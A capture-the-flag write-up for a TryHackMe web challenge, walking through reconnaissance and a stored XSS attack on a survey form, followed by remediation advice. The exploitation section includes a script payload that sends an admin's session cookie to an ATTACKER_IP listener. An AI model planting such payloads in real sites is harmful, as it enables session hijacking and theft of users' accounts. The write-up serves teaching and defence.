# Cupid's Matchmaker — Love At First Breach CTF (TryHackMe)

**Category:** Web Exploitation  
**Vulnerability:** Stored XSS → Session Cookie Exfiltration  
**Difficulty:** Easy

---

## TL;DR

A web app exposes a survey form whose responses are reviewed by an admin. By injecting a stored XSS payload into the survey, we exfiltrate the admin's session cookie via an HTTP listener. The cookie is the flag.

---

## Reconnaissance

### Port Scan

![IMG 1](/challenges/screenshots/cupids_matchmaker/image.png)

**Open ports:**
- `22` — SSH
- `631` — IPP (Internet Printing Protocol), not relevant to this challenge
- `80` — HTTP

### Web Application

The app presents a single visible feature: a survey form. Nothing else on the surface.
![IMG 2](/challenges/screenshots/cupids_matchmaker/image(1).png)
![IMG 3](/challenges/screenshots/cupids_matchmaker/image(2).png)


### Directory Fuzzing

![IMG 4](/challenges/screenshots/cupids_matchmaker/image(3).png)

**Discovered endpoints:**
- `/admin`
- `/login`
- `/logout`

Navigating to `/admin` redirects to `/login`. No account registration is available.

### Login Page — SQLi Testing

Basic SQLi payloads on the login form yielded no results. Username enumeration also appeared impossible. Moving on.

---

## Identifying the Attack Vector

After completing the survey, the server sets a cookie. Inspecting it reveals it is a **Flask session cookie** (not a JWT, despite the similar base64 appearance — jwt.io can help distinguish between the two).

![IMG 5](/challenges/screenshots/cupids_matchmaker/image(5).png)
![IMG 6](/challenges/screenshots/cupids_matchmaker/image(6).png)



The attack path becomes clear:

1. An admin reviews submitted survey responses.
2. If the survey input is not sanitised, we can inject a script that runs in the admin's browser.
3. That script can exfiltrate the admin's cookie to our listener.

---

## Exploitation

### Step 1 — Set Up an HTTP Listener

```bash
python3 -m http.server 4444
```

### Step 2 — Inject Stored XSS Payload

In the survey form, intercept the POST request with BurpSuite and submit the following payload as one of the answers:

```html
<script>fetch("http://<ATTACKER_IP>:4444/?test="%2bdocument.cookie);</script>
```

Don't forget to URL-encode the character '+' (%2b URL-encoded), because this would be interpreted as a simple white space in the request. I used the "name" parameter for the XSS.

![IMG 7](/challenges/screenshots/cupids_matchmaker/image(8).png)

### Step 3 — Receive the Cookie

When the admin reviews the survey, their browser executes the script and sends a GET request to our listener. Their cookie (the flag) is included in the request as a parameter :

![IMG 8](/challenges/screenshots/cupids_matchmaker/image(9).png)


---

## Remediation

**1. Sanitise and encode all user input before rendering it**  
Any content submitted through a form that will be displayed to other users (especially privileged ones like admins) must be HTML-encoded server-side. Libraries like Bleach (Python) make this straightforward.

**2. Implement a Content Security Policy (CSP)**  
A strict CSP header prevents inline scripts from executing, which would neutralise this payload even if the XSS injection point exists:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**3. Set the HttpOnly flag on session cookies**  
Marking the session cookie as `HttpOnly` prevents JavaScript from reading it via `document.cookie`, which would have blocked this exact exfiltration technique:
```
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
```

**4. Validate and reject unexpected input server-side**  
Survey fields should have server-side validation that rejects input containing HTML tags or JavaScript patterns.

